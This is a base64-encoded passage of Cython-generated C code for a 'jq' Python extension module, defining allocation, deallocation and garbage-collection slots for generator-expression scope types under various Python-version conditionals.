biAgTlVMTCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDBcbiAgMCwgXG4gICNlbmRpZlxufTtcbiNlbmRpZlxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHtcbiAgUHlPYmplY3QgKm87XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7XG4gIG8gPSBhbGxvY19mdW5jKHQsIDApO1xuICAjZWxzZVxuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpKSkge1xuICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByXTtcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKTtcbiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTtcbiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApO1xuICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwO1xuICB9XG4gICNlbmRpZlxuICByZXR1cm4gbztcbn1cblxuc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeU9iamVjdCAqbykge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilvO1xuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkge1xuICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIHtcbiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjtcbiAgICB9XG4gIH1cbiAgI2VuZGlmXG4gIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICBQeV9DTEVBUihwLT5fX3B5eF92X2kpO1xuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpKSkge1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKW8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTtcbiAgICAjZWxzZVxuICAgIHtcbiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7XG4gICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gIH1cbn1cblxuc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHtcbiAgaW50IGU7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKW87XG4gIHtcbiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpO1xuICAgIGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfaSkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfaSwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjID0ge1xuICAianEuX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLFxuICBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA9IHtcbiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApXG4gICJqcS4iIl9fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIiLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIFxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCBcbiAgMCwgXG4gIF9fcHl4X3RwX3RyYXZlcnNlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIF9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTtcbiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7XG4gICNlbHNlXG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJdO1xuICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKSB7XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkge1xuICBpbnQgZTtcbiAgc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfdl9pKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9pLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc2xvdHNbXSA9IHtcbiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sXG4gIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSxcbiAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMgPSB7XG4gICJqcS5fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpLFxuICAwLFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsXG4gIF9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc2xvdHMsXG59O1xuI2Vsc2Vcblxuc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgImpxLiIiX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksIFxuICAwLCBcbiAgX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgMCwgXG4gICNlbHNlXG4gIE5VTEwsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwKVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwXG4gIDAsIFxuICAjZW5kaWZcbn07XG4jZW5kaWZcblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpO1xuICBvID0gYWxsb2NfZnVuYyh0LCAwKTtcbiAgI2Vsc2VcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHtcbiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl07XG4gICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSk7XG4gICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgIG8gPSAoKnQtPnRwX2FsbG9jKSh0LCAwKTtcbiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDtcbiAgfVxuICAjZW5kaWZcbiAgcmV0dXJuIG87XG59XG5cbnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAoIVB5VHlwZV9JU19HQyhQeV9UWVBFKG8pKSB8fCAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJqcV9fX3B5eF9z